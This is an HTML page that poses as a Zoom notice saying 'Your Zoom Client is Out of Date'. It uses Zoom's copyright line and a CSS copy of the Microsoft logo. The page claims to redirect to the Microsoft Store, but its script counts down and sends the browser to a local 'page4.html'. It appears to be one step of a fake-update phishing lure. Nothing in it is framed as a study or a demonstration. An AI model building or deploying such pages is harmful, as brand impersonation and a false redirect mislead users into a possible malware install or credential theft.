<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Zoom Update</title>

    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: Arial, sans-serif;
      }

      body {
        width: 100%;
        height: 100vh;
        background: #ffffff;

        display: flex;
        justify-content: center;
        align-items: center;
      }

      .container {
        text-align: center;
        width: 500px;
      }

      h1 {
        color: #1b5fd1;
        font-size: 28px;
        font-weight: 700;
        margin-bottom: 12px;
      }

      .text {
        color: #6b6b6b;
        font-size: 18px;
        margin-bottom: 8px;
      }

      .text2 {
        color: #1b5fd1;
        font-size: 18px;
        margin-bottom: 20px;
      }

      .redirect {
        color: #1b5fd1;
        font-size: 22px;
        margin-bottom: 35px;
      }

      /* Loader */

      .loader {
        width: 45px;
        height: 45px;

        border: 4px solid #d9d9d9;
        border-top: 4px solid #1b5fd1;

        border-radius: 50%;

        margin: 0 auto 40px;

        animation: spin 1s linear infinite;
      }

      @keyframes spin {
        100% {
          transform: rotate(360deg);
        }
      }

      .bottom-text {
        color: #777;
        font-size: 17px;
        margin-bottom: 25px;
      }

      /* Button */

      .store-btn {
        width: 360px;
        height: 58px;

        border: 2px solid #1b5fd1;
        border-radius: 40px;

        background: white;

        display: flex;
        align-items: center;
        justify-content: center;
        gap: 12px;

        margin: auto;

        cursor: pointer;

        transition: 0.3s;
      }

      .store-btn:hover {
        background: #f5f8ff;
      }

      /* Microsoft Logo */

      .microsoft-logo {
        width: 24px;
        height: 24px;

        display: grid;
        grid-template-columns: 1fr 1fr;
        gap: 2px;
      }

      .box {
        width: 11px;
        height: 11px;
      }

      .red {
        background: #f25022;
      }

      .green {
        background: #7fba00;
      }

      .blue {
        background: #00a4ef;
      }

      .yellow {
        background: #ffb900;
      }

      .btn-text {
        color: #1b5fd1;
        font-size: 18px;
        font-weight: 500;
      }

      .footer {
        margin-top: 70px;
        color: #888;
        font-size: 13px;
      }
    </style>
  </head>

  <body>
    <div class="container">
      <h1>Your Zoom Client is Out of Date</h1>

      <div class="text">
        Please wait while you're redirected to Microsoft Store...
      </div>

      <div class="text2">
        Please wait while you're redirected to Microsoft Store...
      </div>

      <div class="redirect" id="countdown">Redirecting in 7 seconds</div>

      <div class="loader"></div>

      <div class="bottom-text">
        If you are not redirected automatically, click below:
      </div>

      <!-- Button -->

      <button class="store-btn">
        <!-- Microsoft Logo -->

        <div class="microsoft-logo">
          <div class="box red"></div>
          <div class="box green"></div>
          <div class="box blue"></div>
          <div class="box yellow"></div>
        </div>

        <div class="btn-text">Microsoft Store&nbsp; Go to Microsoft Store</div>
      </button>

      <div class="footer">
        © Zoom Video Communications, Inc. All rights reserved.
      </div>
    </div>

    <script>
      let seconds = 7;

      const countdown = document.getElementById("countdown");

      const timer = setInterval(() => {
        seconds--;

        countdown.innerHTML = `Redirecting in ${seconds} seconds`;

        if (seconds <= 0) {
          clearInterval(timer);

          // Redirect to page4.html
          window.location.href = "page4.html";
        }
      }, 1000);
    </script>
  </body>
</html>
